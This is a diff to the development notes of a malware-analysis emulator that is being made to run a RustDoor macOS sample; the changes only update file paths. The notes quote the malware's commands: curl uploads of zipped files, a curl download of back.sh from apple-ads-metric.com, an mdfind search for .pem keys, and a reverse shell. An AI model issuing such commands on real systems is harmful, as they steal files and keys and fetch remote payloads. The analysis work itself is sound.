@@ -75,7 +75,7 @@ emulator behavior.
   - **current next blocker:** after the worker bootstraps its kqueue + EVFILT_USER waker, the daemon TID=3 reads 320 bytes from the log-stream pipe (the synthetic `restartInitiated` / `shutdownInitiated` log entries fed in by `posix_spawnp`), then both threads block waiting for further async events. The remaining instruction budget is consumed by the parent process spinning in a `OnceLock`/atomic-load loop at `0x100100728` (function `sub_1001006FC`, an `atomic_load_explicit(&qword_10026D408, memory_order_acquire) != 3` re-check). To reach the rest of Unit42's Table-1 commands (`chflags hidden npm`, `chmod +x npm`, `zsh -c zip -r ...`, `zsh -c curl -F file=...`, `zsh -c curl -O https://apple-ads-metric.com/back.sh`, `zsh -c mdfind -name .pem`) we still need to drive the C2 command loop or add a synthetic producer that actually triggers the registered user/event-loop wakeups after log-stream or network data is made available.
 - Important implication:
   - the in-process bootstrap/runtime/daemonization compatibility blockers are resolved and the emulator now reaches the first article-listed `posix_spawnp` command (`log stream --predicate ... restartInitiated/shutdownInitiated --info`)
-  - Tokio's macOS worker bootstrap (kqueue + EVFILT_USER waker + duplicates) now completes successfully, no more `brk #0x1` on TID=4 — pinned by the `tests/rustdoor_fast_mode.rs` integration test; the lower-level EVFILT_USER receipt/trigger state machine is covered by unit tests in `src/macos/arch_arm64/io_imports.rs`
+  - Tokio's macOS worker bootstrap (kqueue + EVFILT_USER waker + duplicates) now completes successfully, no more `brk #0x1` on TID=4 — pinned by the `tests/rustdoor_fast_mode.rs` integration test; the lower-level EVFILT_USER receipt/trigger state machine is covered by unit tests in `crates/machina-runtime/src/macos/arch_arm64/io_imports.rs`
   - the next compatibility work for this family is making Tokio's poll loop emit synthetic events for the C2 HTTP requests / log-stream pipe, so the malware progresses past its async wait and into the remaining `posix_spawnp` calls (chflags / chmod / curl / zip / mdfind / reverse-shell)
 - Recommended local invocation:
   - `MACHINA_PROFILE=long .\target\debug\machina.exe fixtures\macos\bin\rustdoor\76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho > rustdoor-trace-long.jsonl`
@@ -105,7 +105,7 @@ emulator behavior.
     vtable placeholders, VTT placeholders, and `ctype<char>::id`).
     Chained fixups prefer these data-symbol bindings over function
     stubs so data loads do not interpret stub bytes as objects.
-  - `src/macos/arch_arm64/cpp_imports.rs` now covers the libc++
+  - `crates/machina-runtime/src/macos/analysis_arm64/cpp_imports.rs` now covers the libc++
     surface this sample exercises with standard hooks rather than
     sample-local object layouts: string init/copy/destroy,
     `assign`, `compare`, `find`/`rfind`, `append`, `erase`,
